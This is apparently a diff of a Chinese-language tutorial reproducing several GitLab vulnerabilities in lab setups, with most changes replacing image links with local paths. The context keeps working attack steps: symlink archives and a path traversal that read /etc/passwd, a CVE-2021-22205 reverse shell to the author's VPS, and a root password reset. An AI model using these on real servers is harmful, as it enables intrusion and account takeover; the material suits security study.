@@ -88,35 +88,35 @@ Web 页面：
 
   环境搭好后需要更改密码，先创建普通用户，并登录：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/L58vYnUXOYpL16rmNQoLGD7yzfTckRrfNUibibd1Wv5buadcicjHAfpQWUJBtIza4KrhVSMjtHnMlnN2ZCLfU3fvg/640?wx_fmt=png)
+![](../../.resource/remote/b58d0146f3a9c0db9f35a656838350db6605836c99a68dea507dd311cc43683d.png)
 
 ### **漏洞复现**
 
   然后新建项目
 
-![](https://mmbiz.qpic.cn/mmbiz_png/L58vYnUXOYpL16rmNQoLGD7yzfTckRrf2pTkcdQUh6g6NRUFUtHeyLVrgvwHVVTyhP4CSNc7zvvJBrQ4cibstvQ/640?wx_fmt=png)
+![](../../.resource/remote/bf7bc22a2750408a93255b00eb4155debb887cf8b753460b01ee26801844b739.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/L58vYnUXOYpL16rmNQoLGD7yzfTckRrfUX0uFwD9uAb7TRbnpZ2pEichCcZ10cicRuIc3Wb1Nc2MlqkuQ9LDntcQ/640?wx_fmt=png)
+![](../../.resource/remote/ae362d9bcd2dc0d2842c8ddf7482cd200d5958d943362c7fa9bbc7e7dbaf1c9c.png)
 
   抓包并查看 authenticity_token 的值
 
 <table border="1" cellspacing="0" cellpadding="0"><tbody><tr><td width="1086" valign="middle"><p>WmZhMvRYay9X3p27Ai%2Fu28xW5ndPsJrKVk3aCsas%2B0fUqNmligcX%2FqkzmBMSFElxjUKJRbscBcWDm3WCNG8zaw%3D%3D</p></td></tr></tbody></table>
 
-![](https://mmbiz.qpic.cn/mmbiz_png/L58vYnUXOYpL16rmNQoLGD7yzfTckRrfBvfqs55hvPDl9ictD9c7wtJJiaBQ4R6pQWldWWg1VPKroF9gQGZMqOiaA/640?wx_fmt=png)
+![](../../.resource/remote/d25c00872ccace9366c0bb356db7e933b0490aafddea0ebdab5445b83e8fd0eb.png)
 
   把包内容全部删除
 
-![](https://mmbiz.qpic.cn/mmbiz_png/L58vYnUXOYpL16rmNQoLGD7yzfTckRrfrdlcibLbQUv6kiceCud9J2sB3hwc9V3tUl3OP8icOxI1WaXIga3K5kSzg/640?wx_fmt=png)
+![](../../.resource/remote/b966e76598bb78747743576777234040e85a69ca1c528714dffd24f10a644e52.png)
 
   返回浏览器访问 your-ip/admin/users/stop_impersonation?id=root
 
-![](https://mmbiz.qpic.cn/mmbiz_png/L58vYnUXOYpL16rmNQoLGD7yzfTckRrfz21PoBpibCWfNHgqcQZ0qrzlxmCmwibbM0v1ldK4HQh2ic7ZFwx42P9jw/640?wx_fmt=png)
+![](../../.resource/remote/a5db5a007cbc92bb684aae497abbc6f9ff4cffa10f34eebaabfe2747e690d735.png)
 
   丢弃掉空白的包，会看到新的包
 
-![](https://mmbiz.qpic.cn/mmbiz_png/L58vYnUXOYpL16rmNQoLGD7yzfTckRrfwWarFelD61MabwParDfkELNiaGaNTdLJbLACeGYThPpHL6Z4DvnCTRg/640?wx_fmt=png)
+![](../../.resource/remote/ae708e127436fa1ac3ccfef56ba1de12f87bc391baa16e4bc2930b2acdbf0869.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/L58vYnUXOYpL16rmNQoLGD7yzfTckRrfLyNUnQjGnQpxngHBu5IiadRT9dxdREWqhevyrjuIiciaibibKlaOGlpHpgg/640?wx_fmt=png)
+![](../../.resource/remote/bc068bc10523c4ea7e2d047bb999ebc5a3e8e5ac1d184245713619a016733a5c.png)
 
   把数据包修改成 post 并加入 post 参数，最后把刚刚获取 authenticity_token 值替换进去。放包
 
@@ -124,7 +124,7 @@ Web 页面：
 
   成功获取 root 权限
 
-![](https://mmbiz.qpic.cn/mmbiz_png/L58vYnUXOYpL16rmNQoLGD7yzfTckRrfNNHtJz8OVJsv2IDBOVWjolicKTst9cjTib2v7WYWQy7v56oePJpUkRJg/640?wx_fmt=png)
+![](../../.resource/remote/2f1ad1253d3ec6e2f6eba3c124aac9fb232070ce9a599958eb488e02eb90c203.png)
 
 **2、任意文件读取漏洞（CVE-2016-9086）**
 -----------------------------
@@ -151,23 +151,23 @@ Web 页面：
 
   注册并登录一个帐户：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/L58vYnUXOYpL16rmNQoLGD7yzfTckRrfq70wF8KezKiblUjxjXybJPTavgr4vH978s7u0fMZHME4CH36GXMDGNw/640?wx_fmt=png)
+![](../../.resource/remote/8d8d7e2f15ee9e467b687ca99ddd0b617347a9b632cde1c3d5fe479c1de74e08.png)
 
   然后单击”新建项目 “页面上的“GitLab 导出” 按钮：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/L58vYnUXOYpL16rmNQoLGD7yzfTckRrfibTrJTUXGLkW4PsryQLicLHarYjr4WMh1swA7unLsvHuicsCgLKNfvsGA/640?wx_fmt=png)
+![](../../.resource/remote/21bca88860e77d318b360e1fcca2fde4c1ccbfd9bb73e06b6f3cb8fc3215dbd9.png)
 
   上传文件 test.tar.gz，访问文件发现被泄露：/etc/passwd
 
-![](https://mmbiz.qpic.cn/mmbiz_png/L58vYnUXOYpL16rmNQoLGD7yzfTckRrfzLiadyAHAMp6MggpcoFTyGAeE2Y5CouraumVTHtpX1cJOdsktLfCXSw/640?wx_fmt=png)
+![](../../.resource/remote/b799c8f9ec8513364eb9d5e78846fd0c8a392a28db2f1fe4b2514ab453d8d8c3.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/L58vYnUXOYpL16rmNQoLGD7yzfTckRrfE5RLD76KgL3ozMxpVCLUmqlibtjwCvsiae5VFOZKjaFkZKYyFHnKJScQ/640?wx_fmt=png)
+![](../../.resource/remote/72280bd6b2647ad29e9d890ec14066a5be9f3fedefc68384ce527e33860eae56.png)
 
 ### **原理分析**
 
   一个空的项目导出后结构如下：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/L58vYnUXOYpL16rmNQoLGD7yzfTckRrf2GpteyWD9t8H3oicOTS93t4JiccBbzzWTC4t1Rp7ylSq4N0Akicgo4AsA/640?wx_fmt=png)
+![](../../.resource/remote/d5fa33fc1338713ad3ece96e8e13d496a44414c12368592e62723fd549abdfc3.png)
 
   VERSION 的文件内容为 GitLab 的导出模块的版本，project.json 则包含了项目的配置文件。
 
@@ -185,13 +185,13 @@ Web 页面：
 
 <table border="1" cellspacing="0" cellpadding="0"><tbody><tr><td width="909" valign="middle"><p>ln -sf /etc/passwd VERSION</p><p>tar zcf change_version.tar.gz ./</p></td></tr></tbody></table>
 
-![](https://mmbiz.qpic.cn/mmbiz_png/L58vYnUXOYpL16rmNQoLGD7yzfTckRrfhJLtricXnmPR8IBt9wl1AePCU3PbpNo8Fr3zZXG5qNbIPXPXRyuGpLw/640?wx_fmt=png)
+![](../../.resource/remote/98aa2cb13e2a3804be4698145713fc8d5554b4e207a7155dae931924fb8ff0d9.png)
 
   这样，读取 VERSION 文件的时候服务器就会根据软链接读取到 / etc/passwd 的第一行内容并赋值给 version。但是由于 version 与当前版本不相同，所以会输出 version 的值，也就是 / etc/passwd 第一行的内容。
 
   访问之前搭建好的 GitLab 服务器，创建一个新的项目，填写完项目名称后在一栏中选择 Import project fromGitLab ，export 上传我们修改后的导入包，然后就可以看到 / etc/passwd 文件第一行
 
-![](https://mmbiz.qpic.cn/mmbiz_png/L58vYnUXOYpL16rmNQoLGD7yzfTckRrfknbjh7FoMMf0HqeFJtdI5vbXwRJXZdTZZUy4hlabGVyaTXOHlNrjhg/640?wx_fmt=png)
+![](../../.resource/remote/3997c8b66f38203dc89811be83b1b0038e51a05b2853a0069feb595134dd96ec.png)
 
   但是，如果只读取任意文件的第一行，能做的事情还是太少了。漏洞发现者显然不满足这一结果，他继续找了下去.
 
@@ -207,11 +207,11 @@ Web 页面：
 
 <table border="1" cellspacing="0" cellpadding="0"><tbody><tr><td width="909" valign="middle"><p>ln -sf /etc/passwd project.json</p><p>tar zcf change_version.tar.gz ./</p></td></tr></tbody></table>
 
-![](https://mmbiz.qpic.cn/mmbiz_png/L58vYnUXOYpL16rmNQoLGD7yzfTckRrf63F7M2ejp86UV1kuLQ6tpQt89oNEuSrYd5blxS2U8h5IswM54DyxlA/640?wx_fmt=png)
+![](../../.resource/remote/9d02211acfdd0127bb954f2a6234eb44fd45461879b80d0270548eec1e718aa7.png)
 
   上传导出包，页面上显示的结果：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/L58vYnUXOYpL16rmNQoLGD7yzfTckRrfE5RLD76KgL3ozMxpVCLUmqlibtjwCvsiae5VFOZKjaFkZKYyFHnKJScQ/640?wx_fmt=png)
+![](../../.resource/remote/72280bd6b2647ad29e9d890ec14066a5be9f3fedefc68384ce527e33860eae56.png)
 
 ### **参考链接**
 
@@ -236,27 +236,27 @@ Web 页面：
 
   将 IP 改为自己电脑本机 IP，运行搭建成功访问即可，环境搭好后需要更改密码
 
-  在此处创建一个新的账号。![](https://mmbiz.qpic.cn/mmbiz_png/L58vYnUXOYpL16rmNQoLGD7yzfTckRrfIia7NvBHDD6AvCfsVvKZhZiahgrGMhmI50EerGtzB5Xt7rIudOGOYNpQ/640?wx_fmt=png)
+  在此处创建一个新的账号。![](../../.resource/remote/6405716e4b675ce8e3143e97a7f5f64a7036ab2adf341feb39b1d81d372a6c6c.png)
 
 ### **漏洞复现**
 
   登录 gitlab, 创建两个 project
 
-![](https://mmbiz.qpic.cn/mmbiz_png/L58vYnUXOYpL16rmNQoLGD7yzfTckRrfOeokYy65hDzXMWBIQeg6DpaV8EjIgUe7fibEiccInYVzrIjrlqq4z7Tg/640?wx_fmt=png)
+![](../../.resource/remote/bb515fe8933bf70e21159dfe1d5199a52dcd49f3f2eb725f13a03bb63dac17bc.png)
 
   在 project1 中创建 issues。
 
-<table border="1" cellspacing="0" cellpadding="0"><tbody><tr><td width="909" valign="middle"><p>![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/passwd)</p></td></tr></tbody></table>
+<table border="1" cellspacing="0" cellpadding="0"><tbody><tr><td width="909" valign="middle"><p><code>![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/passwd)</code></p></td></tr></tbody></table>
 
-![](https://mmbiz.qpic.cn/mmbiz_png/L58vYnUXOYpL16rmNQoLGD7yzfTckRrf59DrV3Ghg8icP1fw8ibX0CEcmcgeBaDVLpZGiaXhfX6BD9UgpZkMFce8g/640?wx_fmt=png)
+![](../../.resource/remote/5138c8ebffe1f17fcc852f99f9cf654e0dcc6c0857b093995f9b89a6cd17dfbe.png)
 
   将 issues move 到 project2 中。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/L58vYnUXOYpL16rmNQoLGD7yzfTckRrfKz4JHdbyyqpGYefmzEHOrFJn7a4onv2qsqPMIKQkYHmLBh3Is9cpMg/640?wx_fmt=png)
+![](../../.resource/remote/8487ffee1187e2369e7cdda42f9c7b8d46355f917c696e49df04c5d22a1a3f1d.png)
 
   移动成功后，点击链接即可下载指定文件
 
-![](https://mmbiz.qpic.cn/mmbiz_png/L58vYnUXOYpL16rmNQoLGD7yzfTckRrfT6lSnQOC5AexQ2xsh1P9xtdp4xVCpUY63IExtMHib695bhPAruuH26A/640?wx_fmt=png)
+![](../../.resource/remote/32e5b22a017a63952a0fe2fa68d185e905299d9516d61021340bcb6400f45e2e.png)
 
 ### **漏洞 exp**
 
@@ -287,7 +287,7 @@ Web 页面：
 
   环境启动后，访问 http://your-ip:8080 即可查看到 GitLab 的登录页面。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/L58vYnUXOYpL16rmNQoLGD7yzfTckRrfE2BLYYAXiaYUGxaiajshlbKIyCicSibDf0q1bxUfkjsiaWS90KrWYy3tKcw/640?wx_fmt=png)
+![](../../.resource/remote/44a1f98986390e4a5712028e0fa2b3af7d72202a3841d5c46000538c8b33492f.png)
 
 ### **漏洞复现**
 
@@ -297,7 +297,7 @@ Web 页面：
 
 <table border="1" cellspacing="0" cellpadding="0"><tbody><tr><td width="909" valign="middle"><p>python poc.py http://your-ip:8080 "touch /tmp/success"</p></td></tr></tbody></table>
 
-![](https://mmbiz.qpic.cn/mmbiz_png/L58vYnUXOYpL16rmNQoLGD7yzfTckRrfibK8cibm8ficuNFApLW6M8ocw2WAJ0fGK2icOW6TAtThc5vV9zQIrsFGew/640?wx_fmt=png)
+![](../../.resource/remote/17c3ec5f94562bcc017e0efc98d83e47dd807a679eeb3c4b41f94b18e2bff89f.png)
 
   进入容器查看
 
@@ -305,7 +305,7 @@ Web 页面：
 
   可见 touch /tmp/success 已成功执行：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/L58vYnUXOYpL16rmNQoLGD7yzfTckRrfDeIEMukQ3yj0stDyeQ3BzELIhDSmLAJLo6taa11WibyLVzvrH9I94jw/640?wx_fmt=png)
+![](../../.resource/remote/ec9fe23308b8d05a8bc9ceb410781f0af91675edb1d2c5c71390ec19d97d95d7.png)
 
 #### **2、详细分析**
 
@@ -313,7 +313,7 @@ Web 页面：
 
 <table border="1" cellspacing="0" cellpadding="0"><tbody><tr><td width="909" valign="middle"><p>GET /users/sign_in</p></td></tr></tbody></table>
 
-![](https://mmbiz.qpic.cn/mmbiz_png/L58vYnUXOYpL16rmNQoLGD7yzfTckRrfgrbN591nND7q7wHsrDT7icfQ3A4lzLRCiblcnNhLFBmibjEQiaAWqL072w/640?wx_fmt=png)
+![](../../.resource/remote/150b26052e0238519d15726943c5952cc08ca21228a7d7e563ca55d7aa1e682c.png)
 
  RCE
 
@@ -321,11 +321,11 @@ Web 页面：
 
    这个下图是之前做的，所以找不文件了，内容都是一样，明白 POST 提交的数据包是什么内容即可。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/L58vYnUXOYpL16rmNQoLGD7yzfTckRrfLibicAMlxjdoAwicT2e4HIuTwVuyddyb9VJaEcAoIRxAb9NYkClJjLg7Q/640?wx_fmt=png)
+![](../../.resource/remote/1b442f85c5fe174e9bb31f930e8d4cbc73c4a6fd07911bc26584a9fe2d4d8284.png)
 
    关于 vulhub 的 poc.py 脚本内容，数据也是和我们上面所发送的数据包一致：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/L58vYnUXOYpL16rmNQoLGD7yzfTckRrfF0ytX3PeaCk9IACWyaA2xammOiayT4XBE6Fgr3EUQSD7uia4gBFCt6wA/640?wx_fmt=png)
+![](../../.resource/remote/5408ab32492c3980c4cfc56d7ed4144392511e5e42b628e51cfeaf821a297d22.png)
 
 #### **3、完整复现**
 
@@ -335,11 +335,11 @@ Web 页面：
 
    环境如下：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/L58vYnUXOYpL16rmNQoLGD7yzfTckRrfibmcKJrRLj7D0kYNOFQMSUnS6UqMuJROiacibpLZpXPKU2az4NwJVdtcQ/640?wx_fmt=png)
+![](../../.resource/remote/0acd4af3f0cdc37aebd2b4de70f32dc5f4b4274a8b1cacc4248b2548f4e3d084.png)
 
   浏览器访问本机 IP:80 即可成功访问到 gitlab 界面。需要设置密码，我这里随便设了一个。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/L58vYnUXOYpL16rmNQoLGD7yzfTckRrftSTMZjteXI83Gwr33ibsdoXsIjBib5iahiaPVxMJ35Nz2O4P8RqnNHLfrw/640?wx_fmt=png)
+![](../../.resource/remote/404c8c0b5f2e50540cc12bb00292dfba8d5e0a4a51dfb1470cd57224cc68daba.png)
 
   这里直接推荐 Al1ex 师傅的脚本（脚本原理与上面也是一样的）：
 
@@ -353,7 +353,7 @@ Web 页面：
 
     批量检测：若指纹识别得到多个 gitlab，可以放入 txt 里面进行批量验证是否存在本漏洞。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/L58vYnUXOYpL16rmNQoLGD7yzfTckRrfb7zntVFC1lRSQNB6X6iaBcfdChnRsGWXvVG9daKicKfSpQxbUvTaYZrQ/640?wx_fmt=png)
+![](../../.resource/remote/a7cc9c055a40959ae3b38d21ae7f6e69ee45104132c1b55c561de280f0988869.png)
 
   这里我们先验证目标漏洞是否存在：
 
@@ -361,7 +361,7 @@ Web 页面：
 
   返回漏洞存在：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/L58vYnUXOYpL16rmNQoLGD7yzfTckRrfAMPTfXjsIM5l7qLa7TfGRhVtDMZLXG8spHhbC8f1HCNASFSrswciaNA/640?wx_fmt=png)
+![](../../.resource/remote/7c0d337893cad529fc1ab33726ce594becccd597337c9f8a0b6573855cfb42fa.png)
 
   进一步通过 DNSlog 去验证：
 
@@ -371,7 +371,7 @@ Web 页面：
 
   看一下结果，发现 Dnslog 接收到了来自目标主机的数据，说明漏洞确实存在：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/L58vYnUXOYpL16rmNQoLGD7yzfTckRrfKE0Zxtw6luFFC1Q4blibqz52EwcclVDniaF2WxvOgAtIXMwP8nfS6qiag/640?wx_fmt=png)
+![](../../.resource/remote/55c3d04acd98f3d7356fb2b8ef30d3aff15736c5b149f7c89ec3fc6200f823f9.png)
 
         反弹 shell
 
@@ -379,21 +379,21 @@ Web 页面：
 
 <table border="1" cellspacing="0" cellpadding="0"><tbody><tr><td width="909" valign="middle"><p>nc -lvvp 5120</p></td></tr></tbody></table>
 
-![](https://mmbiz.qpic.cn/mmbiz_png/L58vYnUXOYpL16rmNQoLGD7yzfTckRrfqv4B0vux3k3yDyvxOjXnkcHN7bP6kvr2ddQB8bwMNk697eVOzmxtHQ/640?wx_fmt=png)
+![](../../.resource/remote/8d3cdf8f0d6023870b9798511dd3142ae66330cf93c9b14f54664c186e145a0f.png)
 
 <table border="1" cellspacing="0" cellpadding="0"><tbody><tr><td width="909" valign="middle"><p>python CVE-2021-22205.py -a true -t http://192.168.235.129/ -c "echo'bash -i &gt;&amp; /dev/tcp/ 自己 VPS 的 IP/5120 0&gt;&amp;1'&gt; /tmp/1.sh"</p><p>python CVE-2021-22205.py -a true -t http://192.168.235.129/ -c "chmod +x /tmp/1.sh"</p><p>python CVE-2021-22205.py -a true -t http://192.168.235.129/ -c "/bin/bash /tmp/1.sh"</p></td></tr></tbody></table>
 
-![](https://mmbiz.qpic.cn/mmbiz_png/L58vYnUXOYpL16rmNQoLGD7yzfTckRrfXp9XyrQhN4yOxCtE42hGT4ZF5P4lKjtLEuNaD9KkZgibMQ81408cmgQ/640?wx_fmt=png)
+![](../../.resource/remote/3a52e8b65cbcc3007d6c7a7d4a70be64430e3f0fc2ec5891a8d80f5c4e1db359.png)
 
   然后返回来看自己监听的 VPS，可以看到已经得到一个 shell 了
 
-![](https://mmbiz.qpic.cn/mmbiz_png/L58vYnUXOYpL16rmNQoLGD7yzfTckRrf6aVz8N6XibCsuoIDiaOMNdc0icThJMdImsUBIGREMbnCV6slZJvSgy0NQ/640?wx_fmt=png)
+![](../../.resource/remote/74f5c271495ba5695e8b3d5fc0bac8a90726be79e5bf6f7592efef7135b9f008.png)
 
 #### **4、/** 后利用 **/**
 
   前面通过 rce 后拿到的默认是 git 用户，非 root 用户
 
-![](https://mmbiz.qpic.cn/mmbiz_png/L58vYnUXOYpL16rmNQoLGD7yzfTckRrfoaDJecTx6MMCuDMIIAl3Z9OAeVvzQ32MI7JUa6BmibmibjwoqzsgO0fg/640?wx_fmt=png)
+![](../../.resource/remote/fcfbddab29425ed92809a30753ec93f5959157d2ea8e18d7e4637240ad7be94e.png)
 
 ##### **利用方式一：提权**
 
@@ -449,11 +449,11 @@ Web 页面：
 
 注意注意：这里一定要等一等，网上的文章说这里会卡住，其实只是人家程序在加载
 
-![](https://mmbiz.qpic.cn/mmbiz_png/L58vYnUXOYpL16rmNQoLGD7yzfTckRrf7AA5fRgbRy2J6uP4mNZS5KvWIDQVoB1ykHdHf2uJStbCfs8zDSHgew/640?wx_fmt=png)
+![](../../.resource/remote/1a187b5836d36f77e5152c210fc353a994bd9a7757936d7d1b77dd2d19c5c8c2.png)
 
 2、找到 root 用户，一开始我也以为是爆错，心想凉凉了，结果最后是执行了的
 
-![](https://mmbiz.qpic.cn/mmbiz_png/L58vYnUXOYpL16rmNQoLGD7yzfTckRrfYEnrbX8iceXuTnu9EGdickuu26tZNh3gqfvncL7kibn0YVW8y99JpLibZw/640?wx_fmt=png)
+![](../../.resource/remote/53cbb43cbe8a72eab7623344844e249f1fc36f6b336dbd4da9cca3a98055a312.png)
 
 3、更改密码。
 
@@ -461,19 +461,19 @@ Web 页面：
 
  user.password_confirmation = 'admin1234'
 
-![](https://mmbiz.qpic.cn/mmbiz_png/L58vYnUXOYpL16rmNQoLGD7yzfTckRrfpHhvYIe9icdOr6icclB2hFpqpk2Ak2HBmiaDoxNz2SQRjl45rJkQomwSw/640?wx_fmt=png)
+![](../../.resource/remote/301bb11c981a6e78d5136febe891127784ce5a622163595d58b67d3a10a16235.png)
 
 4、最后保存
 
 user.save
 
-![](https://mmbiz.qpic.cn/mmbiz_png/L58vYnUXOYpL16rmNQoLGD7yzfTckRrfMMz568eD48LeD3lbmOoPnwkHssfnao8eeRrhMKuooDiczGT2cWes7XA/640?wx_fmt=png)
+![](../../.resource/remote/87a7fde977cf35d9cf8ba8e937df042463035f5e2fc0f3feffb6b7578eb1e463.png)
 
 5、回到登陆界面，输入 root/admin1234。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/L58vYnUXOYpL16rmNQoLGD7yzfTckRrfIpu5GbBDuCMXtqUOdQGc4ib3vNP2Bqdibf1LMXVSWeQsfEOKyicbqmofA/640?wx_fmt=png)
+![](../../.resource/remote/e67fd40a6d939e30d1402114cab9d8b463c0d781d2bd65dadf59f85786e64a97.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/L58vYnUXOYpL16rmNQoLGD7yzfTckRrflHdul1upj2S97HrpTVwkV742mB8UMIpefXTaWWPRvrJUiaAzymzwxCQ/640?wx_fmt=png)
+![](../../.resource/remote/c33875de19de62c36f3063acf62ddd3e21f91cb32077fe41de22952e91e5846c.png)
 
   发现成功登录，可以得到 gitlab 平台上的源代码。
 
@@ -485,7 +485,7 @@ user.save
 
 在 / etc/passwd 文件中，大家可以把最后这个字段理解为用户登录之后所拥有的权限。如果这里使用的是 bash 命令解释器，就代表这个用户拥有权限范围内的所有权限。Shell 命令解释器如果为 /sbin/nologin，那么，这个用户就不能登录了。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/L58vYnUXOYpL16rmNQoLGD7yzfTckRrfH657tOabMiaaul5vCo37pzbue7zPT760wROtTJvmgl2u3icZYibib9Antw/640?wx_fmt=png)
+![](../../.resource/remote/3ecaf453abad4a4d1bd5d85b4609ba5dc71bc06fdca245f9354b82439ca0b6c6.png)
 
   可以看到，这里的 gti 用户具有 ssh 登录权限，可以通过向 git 用户写入公钥进行登录。
 
